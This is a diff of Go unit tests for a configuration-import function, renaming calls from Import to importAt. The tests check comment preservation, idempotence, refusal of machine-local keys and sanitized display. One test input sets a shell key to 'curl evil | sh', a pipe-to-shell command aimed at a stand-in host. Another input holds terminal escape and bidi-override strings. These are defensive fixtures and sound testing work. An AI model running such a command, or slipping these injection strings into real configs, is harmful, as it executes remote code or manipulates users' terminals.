@@ -106,13 +106,13 @@ func TestImportThroughTheFileKeepsTheTargetsComments(t *testing.T) {
 	path := tempConfig(t, "# my config\n[shared]\nclock = \"24h\" # I think in 24h\n\n[tui.colors]\naccent = 6\n")
 	incoming := "[shared]\nclock = \"12h\"\n[tui.colors]\nwarn = \"#ffaa00\"\n"
 
-	plan, err := Import(path, []byte(incoming), false)
+	plan, err := importAt(path, []byte(incoming), false)
 	require.NoError(t, err)
 	require.Len(t, plan.Apply, 1)
 	assert.Equal(t, "# my config\n[shared]\nclock = \"24h\" # I think in 24h\n\n[tui.colors]\naccent = 6\nwarn = \"#ffaa00\"\n",
 		readFile(t, path))
 
-	plan, err = Import(path, []byte(incoming), false)
+	plan, err = importAt(path, []byte(incoming), false)
 	require.NoError(t, err)
 	assert.True(t, plan.Empty(), "importing the same file twice changes nothing the second time")
 }
@@ -125,7 +125,7 @@ func TestAnImportThatSetsAMachineLocalKeyIsRefusedByName(t *testing.T) {
 	keys = append(append([]Key{}, saved...), Key{Name: "shell", Section: TUI, Kind: KindString, Consumer: "M70"})
 
 	path := tempConfig(t, "[shared]\nclock = \"24h\"\n")
-	_, err := Import(path, []byte("[shared]\nclock = \"12h\"\n[tui]\nshell = \"curl evil | sh\"\n"), true)
+	_, err := importAt(path, []byte("[shared]\nclock = \"12h\"\n[tui]\nshell = \"curl evil | sh\"\n"), true)
 	require.ErrorIs(t, err, ErrMachineLocal)
 	assert.Contains(t, err.Error(), "tui.shell")
 	assert.Equal(t, "[shared]\nclock = \"24h\"\n", readFile(t, path), "nothing else in the file is applied either")
@@ -141,7 +141,7 @@ func TestAnImportedValueIsShownSanitizedAndWrittenExactly(t *testing.T) {
 	path := tempConfig(t, "")
 	incoming := "[tui]\ntheme = \"a\\u001b[2Jb\\u202ec\"\n[tui.keys]\n\"k\\u001b[1m\" = \"v\"\n"
 
-	plan, err := Import(path, []byte(incoming), false)
+	plan, err := importAt(path, []byte(incoming), false)
 	require.NoError(t, err)
 	require.Len(t, plan.Apply, 2)
 	for _, c := range plan.Apply {
